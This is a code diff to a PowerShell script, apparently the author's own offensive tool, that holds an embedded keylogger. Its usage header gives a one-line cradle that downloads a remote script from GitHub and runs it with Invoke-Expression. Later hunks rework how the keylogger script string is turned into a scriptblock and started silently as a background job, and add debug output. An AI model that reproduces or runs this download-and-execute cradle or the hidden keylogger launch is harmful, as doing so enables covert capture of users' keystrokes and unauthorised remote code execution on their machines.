@@ -10,7 +10,7 @@
 FIRST RUN "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
 ########## OR #############
 USE 
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')"
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')" | Format-Table -Wrap -AutoSize
 .SYNOPSIS
 .EXAMPLE
 .EXAMPLE
@@ -223,10 +223,13 @@ namespace KeyLogger {
 ### WORKING ###
 #Invoke-Expression $scriptForKeyloggerAsString
 ### THIS WAS A HELL TO FIND BUT IT WORKS!!!
-$command = '$scriptBlockVar ='+$scriptForKeyloggerAsString+'`n Invoke-Expression $scriptBlockVar'
+$command = '$scriptBlockVar ='+$scriptForKeyloggerAsString+'
+ Invoke-Expression $scriptBlockVar'
 $scriptBlock = [scriptblock]::Create($command)
 ### Starts scriptblock in background
-start-Job -scriptblock $scriptBlock
+$job = start-Job -scriptblock $scriptBlock
+### DEBUG
+$job | Format-List -Property *
 echo "akakakakak"
 }
 
